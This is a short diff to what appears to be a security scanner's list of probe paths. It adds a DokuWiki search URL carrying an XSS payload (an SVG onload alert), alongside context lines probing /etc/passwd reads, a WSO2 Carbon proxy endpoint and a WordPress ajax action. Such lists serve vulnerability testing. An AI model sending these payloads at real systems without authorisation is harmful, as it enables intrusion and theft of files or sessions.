@@ -68,3 +68,4 @@
 /etc/passwd?raw??
 /carbon/admin/jsp/WSRequestXSSproxy_ajaxprocessor.jsp;b=.jar?uri={{uri_b64}}&pattern=%7E&username=%7E&password=%7E&payload=%7E
 /wp-admin/admin-ajax.php?action=fb3d_send_posts
+/doku.php?id=start&do=search&q=the%20%40%3Csvg%2Fonload%3Dalert%60document.domain%60%3E
